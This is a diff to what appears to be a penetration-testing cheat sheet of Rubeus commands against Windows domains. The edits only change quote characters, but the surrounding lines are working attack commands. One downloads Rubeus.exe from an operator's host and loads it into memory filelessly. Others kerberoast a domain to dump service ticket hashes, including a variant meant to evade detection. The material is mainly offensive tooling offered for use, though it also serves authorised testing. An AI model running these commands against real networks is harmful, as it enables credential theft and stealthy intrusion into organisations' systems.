@@ -17,7 +17,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ## execute rubeus from powershell
 #plateform/windows #target/remote #cat/UTILS 
 ```powershell
-[Rubeus.Program]::MainString("klist");
+[Rubeus.Program]::MainString('klist');
 ```
 
 ## monitor
@@ -56,7 +56,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name>
 ```
 
-## Kerberoasting while being "OPSEC" safe, essentially while not try to roast AES enabled accounts
+## Kerberoasting while being 'OPSEC' safe, essentially while not try to roast AES enabled accounts
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /rc4opsec
@@ -121,7 +121,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')  
 $assem = [System.Reflection.Assembly]::Load($data)
-[Rubeus.Program]::Main("<rubeus_cmd>".Split())
+[Rubeus.Program]::Main('<rubeus_cmd>'.Split())
 ```
 
 = ticket : c:\Temp\ticket.kirbi
